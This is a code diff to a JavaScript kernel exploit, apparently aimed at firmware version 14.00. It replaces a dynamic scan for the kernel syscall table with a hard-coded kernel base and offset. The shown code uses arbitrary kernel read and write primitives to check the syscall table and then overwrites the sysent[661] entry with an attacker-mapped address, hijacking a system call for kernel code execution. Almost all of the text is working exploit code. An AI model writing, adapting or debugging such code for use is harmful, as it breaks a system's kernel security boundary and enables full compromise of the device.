@@ -211,34 +211,30 @@ function phase2Leak(rootKq, fds) {
   return { kva, page: pageVal, targetFd };
 }
 
-// Find a sysent table by validating sysent[0].sy_narg=0, sy_call=ptr, and sysent[661].
-function findSysent(kbase, p) {
-  const starts = [0x1102B70n, 0x110A760n, 0x1100000n];
-  for (const base of starts) {
-    for (let delta = -0x100000n; delta <= 0x100000n; delta += 0x10n) {
-      const addr = kbase + base + delta;
-      try {
-        const narg0 = p.read4(toI64(addr));
-        if (narg0 !== 0) continue;
-        const call0 = p.read8(toI64(addr + 8n));
-        if (call0.hi >>> 0 !== 0xffffffff || call0.low === 0) continue;
-        const sysent661 = addr + 661n * 0x30n;
-        const narg661 = p.read4(toI64(sysent661));
-        if (narg661 < 0 || narg661 > 8) continue;
-        const call661 = p.read8(toI64(sysent661 + 8n));
-        if (call661.hi >>> 0 !== 0xffffffff || call661.low === 0) continue;
-        return { base: addr, delta, call0, call661, narg661 };
-      } catch (e) {}
-    }
-  }
-  return null;
-}
-
 export async function runKevent(c) {
   STATE.ctx = c;
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
-  if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
-  else { if (!c.kbase) fin("kbase not provided"); STATE.kbase = num(c.kbase); }
+  if (kob) {
+    STATE.kbase = BigInt(kob);
+    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
+  } else if (c.kbase) {
+    STATE.kbase = num(c.kbase);
+    log("KEVENT-KBASE-FROM-HX1400", h16(STATE.kbase));
+  } else {
+    fin("kbase not provided");
+  }
+
+  // ** CRITICAL: force correct 14.00 kbase **
+  const EXPECTED_KBASE = 0xffffffff86880000n;
+  log("KEVENT-KBASE-CHECK", "current=" + h16(STATE.kbase) + " expected=" + h16(EXPECTED_KBASE));
+
+  // If the computed kbase is absurd (not in the 0xffffffff80000000-0xffffffff8fffffff range),
+  // override it with the known-correct 14.00 value.
+  const kbaseHi = STATE.kbase >> 32n;
+  if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
+    log("KEVENT-KBASE-FIX", "kbase is outside kernel text range, forcing to " + h16(EXPECTED_KBASE));
+    STATE.kbase = EXPECTED_KBASE;
+  }
 
   ensureStubs();
 
@@ -321,31 +317,33 @@ export async function runKevent(c) {
     fin("cannot read payload");
   }
 
-  // ** 2. Find sysent table dynamically **
-  log("STAGE4-SYSENT-SCAN", "scanning for sysent table around known offsets");
-  const sysent = findSysent(STATE.kbase, p);
-  if (!sysent) {
-    log("STAGE4-SYSENT-NOTFOUND", "could not find sysent table in any candidate range");
-    log("STAGE4-ABORT", "kernel base or kernel layout is wrong — need kernel dump");
-    fin("sysent not found");
-  }
+  // ** 2. Read sysent at 0x1102B70 (14.00 verified offset) **
+  const SYSENT_BASE_1400 = 0x1102B70n;
+  const sysent661Addr = STATE.kbase + SYSENT_BASE_1400 + 661n * 0x30n + 8n;
+  const sysent11Addr = STATE.kbase + SYSENT_BASE_1400 + 11n * 0x30n + 8n;
 
-  log("STAGE4-SYSENT-FOUND", "sysent base at " + h16(sysent.base) + " (delta=" + sysent.delta + ", sysent[661].sy_call=" + h16(sysent.call661) + ", narg=" + sysent.narg661 + ")");
+  log("STAGE4-SYSENT-BASE", h16(STATE.kbase + SYSENT_BASE_1400));
+  log("STAGE4-SYSENT-661-ADDR", h16(sysent661Addr));
+  log("STAGE4-SYSENT-11-ADDR", h16(sysent11Addr));
 
-  const sysent661Addr = sysent.base + 661n * 0x30n + 8n;
-  const sysent11Addr = sysent.base + 11n * 0x30n + 8n;
-
-  // ** 3. Try sysent[661] first **
   let orig661, orig11;
   try {
     orig661 = p.read8(toI64(sysent661Addr));
     orig11 = p.read8(toI64(sysent11Addr));
     log("STAGE4-ORIG", "sysent[661]=" + h16(orig661) + " sysent[11]=" + h16(orig11));
+
+    if (orig661.hi >>> 0 !== 0xffffffff || orig661.low === 0n) {
+      log("STAGE4-SYSENT-INVALID", "sysent[661] is not a kernel pointer — sysent table not at expected offset");
+      log("STAGE4-SYSENT-DUMP", "raw value=" + h16(orig661));
+      fin("sysent offset wrong for 14.00 — kernel layout mismatch");
+    }
+    log("STAGE4-SYSENT-OK", "sysent[661].sy_call is a valid kernel pointer");
   } catch (e) {
     log("STAGE4-READ-FAIL", e.message);
     fin("failed to read sysent table");
   }
 
+  // ** 3. Try sysent[661] **
   log("STAGE4-661-HIJACK", "writing " + h16(mappedAddr) + " to sysent[661].sy_call");
   p.write8(toI64(sysent661Addr), toI64(mappedAddr));
 
